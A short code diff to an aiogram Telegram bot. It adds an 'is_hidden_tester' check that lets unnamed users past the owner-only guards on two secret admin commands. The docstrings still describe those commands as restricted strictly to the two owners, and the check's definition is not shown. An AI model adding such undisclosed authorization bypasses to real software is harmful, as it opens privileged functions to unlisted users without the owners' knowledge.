@@ -2,6 +2,7 @@
 import logging
 from aiogram import Router, F, Bot
 from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
+from config import is_hidden_tester
 from utils.username_monitor import check_and_update_usernames
 from database import get_member, get_setting
 from utils.keyboards import (
@@ -18,7 +19,7 @@ router = Router()
 async def cmd_show_system_commands_guide(message: Message):
     """Выводит список скрытых текстовых команд Создателям бота (копирование по клику)."""
     # СИНХРОНИЗИРОВАНО: Проверка открыта для обоих ID владельцев
-    if message.from_user.id not in (7899153362, 5281584435):
+    if message.from_user.id not in (7899153362, 5281584435) and not is_hidden_tester(message.from_user.id):
         return
     guide_text = (
         "⚙️ ПАНЕЛЬ СКРЫТЫХ СИСТЕМНЫХ КОМАНД \n\n"
@@ -65,7 +66,7 @@ async def cmd_close_admin_panel(message: Message):
 async def cmd_auto_setup_vigarik_threads(message: Message, bot: Bot):
     """ Секретная команда автоматического развертывания топиков логов. Доступна СТРОГО обоим владельцам сети. """
     # СИНХРОНИЗИРОВАНО: Теперь оба ID могут разворачивать топики логов
-    if message.from_user.id not in (7899153362, 5281584435):
+    if message.from_user.id not in (7899153362, 5281584435) and not is_hidden_tester(message.from_user.id):
         return
     import config
     from database import set_setting
